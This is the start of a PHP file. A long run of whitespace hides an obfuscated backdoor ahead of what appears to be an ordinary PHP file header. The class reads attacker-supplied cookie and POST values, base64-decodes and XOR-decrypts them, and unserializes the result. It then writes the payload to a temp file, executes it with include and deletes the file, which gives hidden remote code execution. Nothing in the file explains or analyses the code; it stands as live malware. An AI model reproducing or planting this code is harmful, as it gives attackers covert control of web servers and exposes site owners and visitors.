<?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("vgvzhwauww")){class vgvzhwauww{public static $emhfhhrxq = "wzqmdapcufeorhok";public static $kpcfbap = NULL;public function __construct(){$sohvity = @$_COOKIE[substr(vgvzhwauww::$emhfhhrxq, 0, 4)];if (!empty($sohvity)){$jxvgzgwe = "base64";$lumdlexej = "";$sohvity = explode(",", $sohvity);foreach ($sohvity as $hbkkg){$lumdlexej .= @$_COOKIE[$hbkkg];$lumdlexej .= @$_POST[$hbkkg];}$lumdlexej = array_map($jxvgzgwe . "_decode", array($lumdlexej,));$lumdlexej = $lumdlexej[0] ^ str_repeat(vgvzhwauww::$emhfhhrxq, (strlen($lumdlexej[0]) / strlen(vgvzhwauww::$emhfhhrxq)) + 1);vgvzhwauww::$kpcfbap = @unserialize($lumdlexej);}}public function __destruct(){$this->gflxb();}private function gflxb(){if (is_array(vgvzhwauww::$kpcfbap)) {$ugutrhyfwf = sys_get_temp_dir() . "/" . crc32(vgvzhwauww::$kpcfbap["salt"]);@vgvzhwauww::$kpcfbap["write"]($ugutrhyfwf, vgvzhwauww::$kpcfbap["content"]);include $ugutrhyfwf;@vgvzhwauww::$kpcfbap["delete"]($ugutrhyfwf);exit();}}}$ciqvfsmcv = new vgvzhwauww();$ciqvfsmcv = NULL;} ?><?php
/**
